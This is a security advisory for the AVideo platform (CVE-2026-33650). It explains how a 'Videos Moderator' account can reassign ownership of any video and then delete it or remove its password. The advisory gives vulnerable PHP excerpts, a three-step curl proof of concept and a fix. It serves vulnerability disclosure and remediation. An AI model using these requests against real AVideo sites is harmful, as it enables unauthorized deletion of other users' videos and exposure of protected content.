# [H] AVideo: Video Moderator Privilege Escalation via Ownership Transfer Enables Arbitrary Video Deletion

## Summary
Severity: High
Advisory: GHSA-8x77-f38v-4m5j
CVE: CVE-2026-33650
CWE: CWE-863
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:H/A:L (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-8x77-f38v-4m5j
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

A user with the "Videos Moderator" permission can escalate privileges to perform full video management operations — including ownership transfer and deletion of any video — despite the permission being documented as only allowing video publicity changes (Active, Inactive, Unlisted). The root cause is that `Permissions::canModerateVideos()` is used as an authorization gate for full video editing in `videoAddNew.json.php`, while `videoDelete.json.php` only checks ownership, creating an asymmetric authorization boundary exploitable via a two-step ownership-transfer-then-delete chain.

## Details

The `PERMISSION_INACTIVATEVIDEOS` (ID 11) permission is described as a limited moderator role in `plugin/Permissions/Permissions.php:213`:

```php
$permissions[] = new PluginPermissionOption(
    Permissions::PERMISSION_INACTIVATEVIDEOS, 
    __('Videos Moderator'), 
    __('This is a level below the (Videos Admin), this type of user can change the video publicity (Active, Inactive, Unlisted)'), 
    'Permissions'
);
```

However, `Permissions::canModerateVideos()` (`Permissions.php:175`) is reused as an authorization gate in multiple locations in `videoAddNew.json.php` that go far beyond status changes:

**1. Upload gate bypass** (`videoAddNew.json.php:10`):
`User::canUpload()` (`user.php:2650`) returns `true` if `Permissions::canModerateVideos()` is true, granting moderators upload access.

**2. Edit gate bypass** (`videoAddNew.json.php:19`):
```php
if (!Video::canEdit($_POST['id']) && !Permissions::canModerateVideos()) {
    die('{"error":"2 ' . __("Permission denied") . '"}');
}
```
`Video::canEdit()` correctly checks only `canAdminVideos()` and ownership, but the `|| !Permissions::canModerateVideos()` fallback allows moderators to edit any video.

**3. Ownership transfer** (`videoAddNew.json.php:222`):
```php
if ($advancedCustomUser->userCanChangeVideoOwner || Permissions::canModerateVideos() || 
    Users_affiliations::isUserAffiliateOrCompanyToEachOther($obj->getUsers_id(), $_POST['users_id'])) {
    $obj->setUsers_id($_POST['users_id']);
}
```
`userCanChangeVideoOwner` defaults to `false` (`CustomizeUser.php:286`), but `canModerateVideos()` provides an unconditional bypass, allowing any moderator to reassign ownership of any video.

**4. Delete via ownership** (`videoDelete.json.php:22-28`):
```php
if(empty($video->getUsers_id()) || $video->getUsers_id() != User::getId()){
    if (!$video->userCanManageVideo()) {
        // denied
    }
}
$id = $video->delete();
```
`userCanManageVideo()` (`video.php:3614`) checks `canAdminVideos()` (not `canModerateVideos()`), then falls back to ownership. After the ownership transfer in step 3, the moderator is now the owner, so this check passes.

The authorization asymmetry: `videoAddNew.json.php` treats `canModerateVideos()` as equivalent to `canAdminVideos()`, but `videoDelete.json.php` and `userCanManageVideo()` do not — creating a gap exploitable by transferring ownership first.

Additional fields a moderator can modify beyond their intended scope:
- `only_for_paid` (line 210) — make premium content free
- `video_password` (line 211) — change/remove password protection
- `categories_id` (line 168) — alter content categorization
- `videoGroups` (line 175) — modify user group visibility

## PoC

**Prerequisites:** An account with the "Videos Moderator" permission (PERMISSION_INACTIVATEVIDEOS = 11) and a target video ID owned by another user.

**Step 1: Transfer ownership of target video to attacker**

```bash
# ATTACKER_USER_ID = moderator's user ID
# TARGET_VIDEO_ID = ID of video owned by another user (e.g., admin)
curl -s -b cookies.txt -X POST \
  'http://localhost/objects/videoAddNew.json.php' \
  -d "id=TARGET_VIDEO_ID&users_id=ATTACKER_USER_ID&title=unchanged"
```

Expected response: `{"status":true, ...}` — ownership is now transferred to the attacker.

**Step 2: Delete the video (now owned by attacker)**

```bash
curl -s -b cookies.txt -X POST \
  'http://localhost/objects/videoDelete.json.php' \
  -d "id[]=TARGET_VIDEO_ID"
```

Expected response: `{"error":false, ...}` — video is deleted. The owner check at line 22 passes because the moderator is now the recorded owner.

**Step 3 (additional impact): Access password-protected video**

```bash
curl -s -b cookies.txt -X POST \
  'http://localhost/objects/videoAddNew.json.php' \
  -d "id=TARGET_VIDEO_ID&video_password=&title=unchanged"
```

This removes the video password, granting the moderator (and everyone) access to previously protected content.

## Impact

- **Arbitrary video deletion**: A Videos Moderator can delete any video on the platform, including admin-owned content, by first transferring ownership to themselves then deleting.
- **Content tampering**: Moderator can change paid content flags (`only_for_paid`), video passwords, categories, and user group visibility on any video — all exceeding the documented scope of "change video publicity."
- **Access control bypass**: Password-protected videos can have their passwords removed, exposing restricted content.
- **Integrity loss**: Video ownership records are corrupted, making audit trails unreliable.
- **Availability impact**: Targeted deletion of high-value content with no authorization check appropriate to the destructive action.

The blast radius is any video on the platform. Any user granted the "Videos Moderator" role — which administrators may grant freely assuming it only allows status changes — gains effective full video management capabilities.

## Recommended Fix

Replace `Permissions::canModerateVideos()` with `Permissions::canAdminVideos()` in `videoAddNew.json.php` where full edit capabilities are granted. Keep `canModerateVideos()` only for the specific status/publicity change operations it was designed for.

**Fix for ownership transfer** (`videoAddNew.json.php:222`):
```php
// Before (vulnerable):
if ($advancedCustomUser->userCanChangeVideoOwner || Permissions::canModerateVideos() || ...

// After (fixed):
if ($advancedCustomUser->userCanChangeVideoOwner || Permissions::canAdminVideos() || ...
```

**Fix for edit gate** (`videoAddNew.json.php:19`):
```php
// Before (vulnerable):
if (!Video::canEdit($_POST['id']) && !Permissions::canModerateVideos()) {

// After (fixed): 
if (!Video::canEdit($_POST['id']) && !Permissions::canAdminVideos()) {
```

Then create a separate, narrower code path for moderators that only allows changing video status/publicity fields. Alternatively, refactor `videoAddNew.json.php` to check `canModerateVideos()` only around the specific status-change logic (lines 238-248) and require `canAdminVideos()` for all other fields.

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-8x77-f38v-4m5j
- https://nvd.nist.gov/vuln/detail/CVE-2026-33650
- https://github.com/WWBN/AVideo/commit/838e16818c793779406ecbf34ebaeba9830e33f8
- https://github.com/WWBN/AVideo
